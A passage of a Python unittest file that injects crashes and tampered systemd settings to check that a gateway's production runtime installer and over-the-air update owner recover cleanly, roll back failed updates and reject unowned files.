        tx = self.runtime.root / 'transactions/ADOPT_01'
        self.assertEqual((tx / 'approval.json').read_bytes(), raw)
        self.fail_start = False
        with self.m.production_lock(): self.assertEqual(self.runtime.recover(tx, args.approval_sha256), 'RECOVERED')
        self.assertEqual((self.home / 'bin/SystemMonitor').read_bytes(), self.elf(b'old-monitor'))
        self.assertFalse((self.runtime.root / 'current.json').exists())

    def test_partial_copy_fsync_and_rename_interruptions_are_owned_and_archived(self):
        for event in ('copy-fsync', 'copy-rename'):
            with self.subTest(event=event):
                # Separate transaction/namespace for each attempt, not a replay.
                self.approval['transaction'] = 'ADOPT_' + event.replace('-', '_')
                args = self.args()
                original_fsync, original_replace = self.m.os.fsync, self.m.os.replace
                fired = []
                def fail_sync(fd):
                    name = os.readlink('/proc/self/fd/' + str(fd))
                    if event == 'copy-fsync' and '.SystemMonitor.production-' in name and not fired:
                        fired.append(name); raise OSError('injected copy fsync crash')
                    return original_fsync(fd)
                def fail_replace(source, target):
                    if event == 'copy-rename' and '.SystemMonitor.production-' in str(source) and not fired:
                        fired.append(str(source)); raise OSError('injected copy rename crash')
                    return original_replace(source, target)
                with mock.patch.object(self.m.os, 'fsync', fail_sync), mock.patch.object(self.m.os, 'replace', fail_replace):
                    with self.assertRaisesRegex(OSError, 'copy .* crash'):
                        with self.m.production_lock(): self.m.production_adopt(args)
                tx = self.runtime.root / 'transactions' / self.approval['transaction']
                self.assertEqual(len(fired), 1)
                self.assertTrue(Path(fired[0]).exists())
                with self.m.production_lock(): self.runtime.recover(tx, args.approval_sha256)
                self.assertFalse(Path(fired[0]).exists())
                self.assertEqual(len(list((tx / 'interrupted-copies').iterdir())), 1)
                self.assertEqual((self.home / 'bin/SystemMonitor').read_bytes(), self.elf(b'old-monitor'))

    def test_unowned_hidden_file_is_not_silently_ignored_or_removed(self):
        self.fail_start = True
        args = self.args()
        with self.assertRaises(ValueError):
            with self.m.production_lock(): self.m.production_adopt(args)
        foreign = self.home / 'bin/.unknown.production-OTHER-install'
        self.write(foreign, b'unknown owner', 0o600)
        tx = self.runtime.root / 'transactions/ADOPT_01'
        with self.assertRaisesRegex(ValueError, 'unowned production runtime'):
            with self.m.production_lock(): self.runtime.recover(tx, args.approval_sha256)
        self.assertEqual(foreign.read_bytes(), b'unknown owner')
        self.assertFalse(self.live)

    def test_process_death_mid_copy_is_recovered_without_ignoring_inventory(self):
        args = self.args()
        pid = os.fork()
        if pid == 0:
            self.write(self.path('/proc') / str(os.getpid()) / 'stat',
                       Path('/proc').joinpath(str(os.getpid()), 'stat').read_bytes())
            original = self.m.os.fsync
            def die(fd):
                if '.SystemMonitor.production-ADOPT_01-install' in os.readlink('/proc/self/fd/' + str(fd)):
                    os._exit(73)
                return original(fd)
            self.m.os.fsync = die
            with self.m.production_lock(): self.m.production_adopt(args)
            os._exit(74)
        _, status = os.waitpid(pid, 0)
        self.assertTrue(os.WIFEXITED(status))
        self.assertEqual(os.WEXITSTATUS(status), 73)
        tx = self.runtime.root / 'transactions/ADOPT_01'
        self.assertEqual(self.g.production_json(tx / 'state.json')['phase'], 'INSTALLING')
        self.assertTrue(self.runtime.copy_name(tx, 'bin/SystemMonitor', 'install').exists())
        with self.m.production_lock(): self.runtime.recover(tx, args.approval_sha256)
        self.assertEqual(len(list((tx / 'interrupted-copies').iterdir())), 1)
        self.assertEqual(self.g.production_files(self.home), self.previous['files'])

    def test_partial_gate_conversion_recovers_exact_old_bodies(self):
        original = self.m.replace
        fired = []
        def fail_gate(path, data, mode=0o600):
            if b' production-unit ' in data and not fired:
                fired.append(path); raise OSError('injected gate conversion crash')
            return original(path, data, mode)
        args = self.args()
        with mock.patch.object(self.m, 'replace', fail_gate):
            with self.assertRaisesRegex(OSError, 'gate conversion'):
                with self.m.production_lock(): self.m.production_adopt(args)
        tx = self.runtime.root / 'transactions/ADOPT_01'
        with self.m.production_lock(): self.runtime.recover(tx, args.approval_sha256)
        self.assertEqual(self.g.production_unit_files(self.units), self.previous['unitFiles'])

    def test_resource_drift_before_start_leaves_fenced_recoverable(self):
        original = self.runtime.convert_gates
        def drift(owner, tx, baseline):
            original(tx, baseline)
            self.write(self.path('/proc/meminfo'), 'MemAvailable: 1 kB\n')
        args = self.args()
        with mock.patch.object(self.m.ProductionRuntime, 'convert_gates', drift):
            with self.assertRaisesRegex(ValueError, 'insufficient MemAvailable'):
                with self.m.production_lock(): self.m.production_adopt(args)
        self.assertFalse(any(c[0] == 'start' for c in self.calls))
        with self.assertRaises(ValueError): self.g.production_unit(self.home, self.g.MONITOR_UNIT)
        self.write(self.path('/proc/meminfo'), 'MemAvailable: 2097152 kB\n')
        with self.m.production_lock(): self.runtime.recover(self.runtime.root / 'transactions/ADOPT_01', args.approval_sha256)

    def test_offline_lock_conflict_refuses_before_approval_or_gate_writes(self):
        import fcntl
        fd = os.open(str(self.path('/run/gateway-offline-runtime.lock')), os.O_RDWR)
        try:
            fcntl.flock(fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
            with self.assertRaises(BlockingIOError):
                with self.m.production_lock(): self.m.production_adopt(self.args())
        finally:
            os.close(fd)
        self.assertFalse(self.runtime.root.exists())

    def test_boot_precedes_launcher_and_never_recreates_retired_or_v11_files(self):
        self.adopt()
        source = self.path('/dev/shm/retired_v10')
        source.unlink()
        self.path('/dev/shm/live_v11').unlink()
        self.write(self.path('/proc/sys/kernel/random/boot_id'), 'NEXT_BOOT\n')
        with self.assertRaises(ValueError):
            self.m.production_boot(types.SimpleNamespace(home=self.home))
        with self.assertRaises(ValueError): self.g.production_unit(self.home, 'gateway-services.service')
        self.assertFalse(source.exists())
        self.assertFalse(self.path('/dev/shm/live_v11').exists())

    def owner_fixture(self, v2=False):
        if v2:
            self.v2_code_only_release()
        else:
            self.adopt()
        self.home.joinpath('ota/staging').mkdir(parents=True)
        artifact = self.root / 'release.tar.gz'
        pointer = self.g.production_json(self.runtime.root / 'current.json')
        self.write(self.payload / 'bin/SystemMonitor', self.elf(b'OTA changed runtime'), 0o755)
        manifest = dict(format='runtime-release-v1', version='1.1', packageType='full', fromAbi=11, toAbi=11,
                        clusterProtocol=2, architecture='aarch64', parents=[pointer['sha256']],
                        expiresAtUnix=int(time.time()) + 600, files=self.g.production_files(self.payload))
        with tarfile.open(artifact, 'w:gz') as archive:
            raw = json.dumps(manifest).encode()
            info = tarfile.TarInfo('runtime-manifest.json'); info.size = len(raw)
            archive.addfile(info, io.BytesIO(raw))
            for relative in manifest['files']:
                archive.add(self.payload / relative, arcname=relative, recursive=False)
        spec = importlib.util.spec_from_file_location('durable_production_health_test', REPO / 'deploy/ota-health-result.py')
        helper = importlib.util.module_from_spec(spec); spec.loader.exec_module(helper)
        owner = helper.RuntimeHandoff(self.home / 'ota/staging', 'POST_SIGNATURE_LOCAL', '12345678-1234-4234-8234-123456789abc')
        lease_path = owner.root / ('ota_job_' + owner.job + '.lock')
        self.write(lease_path, b'', 0o600)
        lease = lease_path.stat()
        intent = dict(format='ota-job-v1', lifecycle='systemd-handoff-v1', jobId=owner.job, token=owner.token,
                      machineCode='FLEET_NODE_NOT_CORE', version='1.1', artifactPath=str(artifact), previousVersion='bootstrap',
                      artifactSize=str(artifact.stat().st_size), artifactSha256=self.m.digest(artifact),
                      leaseDev=str(lease.st_dev), leaseInode=str(lease.st_ino))
        self.write(owner.intent_path, json.dumps(intent) + '\n', 0o600)
        self.write(owner.root / 'ota_active_job.txt', 'jobId=' + owner.job + '\ntoken=' + owner.token + '\n', 0o600)
        stage = owner.root / ('runtime-entry-' + owner.job)
        pins = {}
        for name in ('offline-runtime-upgrade.py', 'runtime-upgrade-guard.py', 'ota-health-result.py'):
            self.write(stage / name, (REPO / 'deploy' / name).read_bytes(), 0o400)
            pins[name] = self.m.digest(stage / name)
        record = dict(format='ota-handoff-v1', phase='OWNER_OWNED', runtimeMayChange=False, jobId=owner.job,
                      token=owner.token, unit=owner.unit, version='1.1', bootId=owner.boot(), entry=str(stage), pins=pins,
                      intentSha256=self.m.digest(owner.intent_path), leaseIdentity=dict(dev=lease.st_dev, inode=lease.st_ino))
        owner.save(record)
        self.patch(owner, 'verify_owner', lambda *a, **k: dict(ActiveState='inactive', MainPID='0', Job=''))
        self.patch(owner, 'no_unit_tasks', lambda *a: None)
        # Only the namespace/systemd boundary is substituted; durable journals,
        # leases, parser, pinned-input checks and official resume run as written.
        self.patch(owner, 'production_entry', lambda r: self.m)
        return owner

    def test_v2_ota_owner_untrusted_config_directory_rejected_before_mutation_barrier(self):
        owner = self.owner_fixture(v2=True)
        directory = self.home / 'config/runtime/devices'
        directory.mkdir()
        directory.chmod(0o775)
        before = (self.home / 'bin/SystemMonitor').read_bytes()
        with self.assertRaisesRegex(ValueError, 'unowned production config directory'):
            with owner.lease():
                self.m.production_ota_owner(owner, owner.read())
        self.assertEqual(owner.read()['phase'], 'OWNER_OWNED')
        self.assertFalse(owner.read()['runtimeMayChange'])
        self.assertFalse((self.runtime.root / 'pending.json').exists())
        self.assertEqual((self.home / 'bin/SystemMonitor').read_bytes(), before)

    def test_v2_ota_owner_trusted_config_directories_complete(self):
        owner = self.owner_fixture(v2=True)
        previous = self.g.production_context(self.home)
        with owner.lease():
            self.m.production_ota_owner(owner, owner.read())
        record = owner.read()
        self.assertEqual(record['phase'], 'OWNER_FINISHED')
        self.assertEqual(record['completionProof']['status'], 'healthy')
        current = self.g.production_context(self.home)
        self.assertEqual(current['generation'], previous['generation'] + 1)
        self.assertEqual(current['configSha256'], previous['configSha256'])

    def test_post_signature_owner_installs_changed_runtime_and_emits_durable_bound_health(self):
        owner = self.owner_fixture()
        with owner.lease(): self.m.production_ota_owner(owner, owner.read())
        record = owner.read()
        self.assertEqual(record['phase'], 'OWNER_FINISHED')
        self.assertTrue(record['runtimeMayChange'])
        self.assertEqual(self.g.production_context(self.home)['release'], '1.1')
        health = self.g.production_json(owner.root / ('health_' + owner.job + '.txt'))
        self.assertEqual((health['status'], health['rollback']), ('healthy', 'none'))
        self.assertEqual(record['completionProof']['healthRecord'], (owner.root / ('health_' + owner.job + '.txt')).read_text())

    def test_original_job_official_recovery_after_promotion_health_version_or_final_crash(self):
        for event in ('before-health', 'current-version', 'applied-version', 'owner-final'):
            with self.subTest(event=event):
                child = ProductionRuntimeTest('test_production_entry_exists_without_changing_legacy_actions')
                child.setUp()
                try:
                    owner = child.owner_fixture()
                    original_record, original_replace, original_save = child.runtime.record, child.m.replace, owner.save
                    def fail_record(runtime, path, value):
                        if event == 'before-health' and path.name == 'health_' + owner.job + '.txt':
                            raise OSError('injected terminal window')
                        return original_record(path, value)
                    def fail_replace(path, data, mode=0o600):
                        if path.name == ('current_version.txt' if event == 'current-version' else 'applied_version.txt' if event == 'applied-version' else ''):
                            raise OSError('injected terminal window')
                        return original_replace(path, data, mode)
                    def fail_save(record):
                        if event == 'owner-final' and record['phase'] == 'OWNER_FINISHED': raise OSError('injected terminal window')
                        return original_save(record)
                    with mock.patch.object(child.m.ProductionRuntime, 'record', fail_record), \
                         mock.patch.object(child.m, 'replace', fail_replace), mock.patch.object(owner, 'save', fail_save):
                        with self.assertRaisesRegex(OSError, 'terminal window'):
                            with owner.lease(): child.m.production_ota_owner(owner, owner.read())
                    self.assertEqual(owner.read()['phase'], 'OWNER_INSTALLING')
                    self.assertFalse((child.runtime.root / 'pending.json').exists())
                    installed = (child.home / 'bin/SystemMonitor').read_bytes()
                    child.calls.clear()
                    owner.recover()
                    self.assertEqual(owner.read()['phase'], 'OWNER_FINISHED')
                    self.assertEqual(owner.read()['completionProof']['status'], 'healthy')
                    self.assertEqual((child.home / 'bin/SystemMonitor').read_bytes(), installed)
                    self.assertFalse(any(c[0] == 'stop' for c in child.calls), 'promoted runtime must not roll back')
                    owner.recover()  # same original job remains consumed
                finally:
                    child.doCleanups()

    def test_failed_rollback_completed_then_owner_final_crash_resumes_original_job(self):
        owner = self.owner_fixture()
        old_monitor = (self.home / 'bin/SystemMonitor').read_bytes()
        original_external, original_save = self.external, owner.save
        def endpoint(command, **kwargs):
            result = original_external(command, **kwargs)
            if command[0] == '/usr/bin/curl' and (self.home / 'bin/SystemMonitor').read_bytes() != old_monitor:
                return subprocess.CompletedProcess(command, 1, b'', b'candidate-only health failure')
            return result
        def fail_final(record):
            if record['phase'] == 'OWNER_FINISHED': raise OSError('injected rollback terminal crash')
            return original_save(record)
        with mock.patch.object(self.m.subprocess, 'run', endpoint), mock.patch.object(owner, 'save', fail_final):
            with self.assertRaisesRegex(OSError, 'rollback terminal'):
                with owner.lease(): self.m.production_ota_owner(owner, owner.read())
        record = owner.read()
        tx = self.runtime.root / 'transactions' / record['productionTransaction']
        self.assertEqual(self.g.production_json(tx / 'state.json')['phase'], 'RECOVERED')
        self.assertFalse((self.runtime.root / 'pending.json').exists())
        self.calls.clear()
        owner.recover()
        result = owner.read()
        self.assertEqual(result['phase'], 'OWNER_FINISHED')
        self.assertEqual((result['completionProof']['status'], result['completionProof']['rollback']), ('failed', 'succeeded'))
        self.assertEqual((self.home / 'bin/SystemMonitor').read_bytes(), old_monitor)
        self.assertFalse(any(c[0] in ('stop', 'start') for c in self.calls))

    def test_boot_hook_resolves_durable_owner_tail_even_without_runtime_pending(self):
        owner = self.owner_fixture()
        original_save = owner.save
        def fail_final(record):
            if record['phase'] == 'OWNER_FINISHED': raise OSError('injected owner terminal crash')
            return original_save(record)
        with mock.patch.object(owner, 'save', fail_final):
            with self.assertRaises(OSError):
                with owner.lease(): self.m.production_ota_owner(owner, owner.read())
        self.assertFalse((self.runtime.root / 'pending.json').exists())
        original_spec = importlib.util.spec_from_file_location
        def local_spec(name, path, *args, **kwargs):
            spec = original_spec(name, path, *args, **kwargs)
            if name == 'production_ota_health':
                delegate = spec.loader
                fixture = self
                class NamespaceLoader:
                    def create_module(self, spec): return None
                    def exec_module(self, module):
                        delegate.exec_module(module)
                        module.RuntimeHandoff.verify_owner = lambda *a, **k: dict(ActiveState='inactive', MainPID='0', Job='')
                        module.RuntimeHandoff.no_unit_tasks = lambda *a: None
                        module.RuntimeHandoff.production_entry = lambda *a: fixture.m
                spec.loader = NamespaceLoader()
            return spec
        self.calls.clear()
        original_stage = self.m.production_boot_stage_entry
        def stage(runtime, authority):
            # Capture the actual kernel flock table while the official caller holds
            # its mapped private lock; never fabricate a positive owner row.
            self.write(self.path('/proc/locks'), Path('/proc/locks').read_bytes())
            self.assertTrue(self.m.production_locked_owner({'ownerProof': self.m.production_owner_proof()}))
            return original_stage(runtime, authority)
        with mock.patch.object(self.m.importlib.util, 'spec_from_file_location', local_spec):
            with mock.patch.object(self.m, 'production_boot_stage_entry', stage):
                self.m.production_boot(types.SimpleNamespace(home=self.home))
            self.assertEqual(owner.read()['phase'], 'OWNER_INSTALLING', 'gate cannot publish untested health')
            self.assertFalse(any(c[0] in ('stop', 'start') for c in self.calls))
            self.m.production_boot_finish(types.SimpleNamespace(home=self.home))
        self.assertEqual(owner.read()['phase'], 'OWNER_FINISHED')

    def test_boot_oneshot_during_start_requires_positive_live_offline_owner(self):
        original_start = self.m.ProductionRuntime.start
        seen = []
        def start(runtime, tx, state, baseline, phase):
            # Run the actual STARTING setup/gates, then invoke the boot hook
            # against actual kernel flock rows and this private process stat.
            original_start(runtime, tx, state, baseline, phase)
            self.write(self.path('/proc/locks'), Path('/proc/locks').read_bytes())
            self.assertTrue(self.m.production_locked_owner(state))
            self.m.production_boot(types.SimpleNamespace(home=self.home))
            seen.append(state['phase'])
        with mock.patch.object(self.m.ProductionRuntime, 'start', start): self.adopt()
        self.assertEqual(seen, ['STARTING'])

    def test_dangling_production_pointer_cannot_fall_back_to_legacy_authority(self):
        self.adopt()
        pointer = self.runtime.root / 'current.json'
        pointer.unlink(); pointer.symlink_to(self.root / 'missing-record')
        with self.assertRaises(ValueError): self.g.startup(self.home)

    def test_mismatched_effective_dropin_or_fragment_denies_before_intent(self):
        original = self.property
        for property_name, value in (('FragmentPath', '/run/systemd/transient/evil.service'),
                                     ('DropInPaths', '/run/systemd/system/evil.conf'), ('NeedDaemonReload', 'yes')):
            with mock.patch.object(self.g, 'systemctl_value', lambda u, p: value if p == property_name else original(u, p)):
                with self.assertRaises(ValueError): self.adopt()
            self.assertFalse(self.runtime.root.exists())

    def test_frozen_two_board_active_allowlists_include_launcher(self):
        # Sealed evidence projections, not fresh board facts or device authority.
        fixture = json.loads((REPO / 'tools/fixtures/production-historical-r2-allowlists.json').read_text())
        for row in fixture['boards']:
            self.assertIn('gateway-services.service', row['activatedUnits'])
            self.assertEqual(row['activeAllowedUnits'], row['activatedUnits'])
            self.assertTrue(set(row['activatedUnits']) <= set(self.g.PRODUCTION_READERS) | {'gateway-services.service'})


if __name__ == '__main__':
    unittest.main()
